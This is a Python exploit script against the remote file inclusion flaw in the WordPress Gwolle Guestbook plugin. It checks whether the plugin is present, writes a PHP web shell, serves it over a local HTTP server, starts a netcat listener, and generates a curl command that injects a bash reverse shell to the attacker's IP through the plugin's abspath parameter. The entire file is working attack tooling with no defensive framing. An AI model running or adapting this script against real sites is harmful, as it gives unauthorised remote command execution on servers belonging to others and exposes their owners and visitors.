#!/usr/bin/python3
import requests
import signal
import sys
import time
import argparse
import os
import threading


def def_handler(sig, frame):
    print("\n\n[+] Exiting...\n")
    sys.exit(1)

#Ctrl_c
signal.signal(signal.SIGINT, def_handler)

#Tool description
parser = argparse.ArgumentParser(description='Verifies if the wordpress page is vulnerable to RFI and in case you want can exploit for you')

#Arguments
parser.add_argument('-u', '--url', type=str, help='Introduce the wordpress page url')
parser.add_argument('-LHOST','--localhost', type=str, help='Introduce your IP address')
parser.add_argument('-LPORT','--localport', type=str, help='Introduce the port from you want to put listening')
parser.add_argument('-s', '--scan', action='store_true', help='Put this parameter if you want to scan de vuln RFI')
parser.add_argument('-x', '--exploit', action='store_true', help='Put this parameter if you want to exploit for you')
#parse init
args = parser.parse_args()


#global variables
main_url = args.url
attacker_ip = args.localhost
attacker_port = args.localport
RFI_vulnerable_path = f"{main_url}/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://{attacker_ip}:{attacker_port}/&cmd=bash%20-c%20%27bash%20-i%20%26%3E/dev/tcp/{attacker_ip}/443%200%3E%261%27" 
def vuln_detect():
    response = requests.get(f"{main_url}/wp-content/plugins/gwolle-gb/")
    #we verify if on the page it is the gwolle plugin
    if (response.status_code != 200):
        print("\n[+] No version of plugin Gwolle detected on " + main_url)
    else:
        print(f"\n[+] Plugin Gwolle was found, {main_url} could possibly be vulnerable to RFI, will be if the version of it is 1.5.3")
        

# Threads to run all this at the same time
def start_http_server():
    os.system(f"python3 -m http.server {attacker_port}") 
def nc_listening():
    os.system("nc -nvlp 443")
def create_wp_load():
    os.system("echo '<?php system($_GET['cmd']);?>' > wp-load.php")
def create_curl():
    os.system(f"echo 'curl -s -X GET \"{RFI_vulnerable_path}\"' > curl.sh && chmod +x curl.sh")

def exploit():
    print("\n[+] Starting to exploit the RFI vuln on " + main_url)
    print("\n[+] To get a reverse shell, execute de file 'curl.sh' in another terminal")
    #wp-load.php archieve creating thread
    wp_load_thread = threading.Thread(target=create_wp_load)
    wp_load_thread.start()

    # Iniciate listenin on the http server with other thread
    http_thread = threading.Thread(target=start_http_server)
    http_thread.start()

    # Start listenting with nc
    nc_listen = threading.Thread(target=nc_listening)
    nc_listen.start()
    #Creating curl.sh file at the same time
    curl_create = threading.Thread(target=create_curl)
    curl_create.start()

    

if __name__ == '__main__':
    if args.scan and args.exploit:
        vuln_detect()
        time.sleep(2)
        exploit()
    elif args.scan:
        vuln_detect()
    elif args.exploit:
        exploit()
        


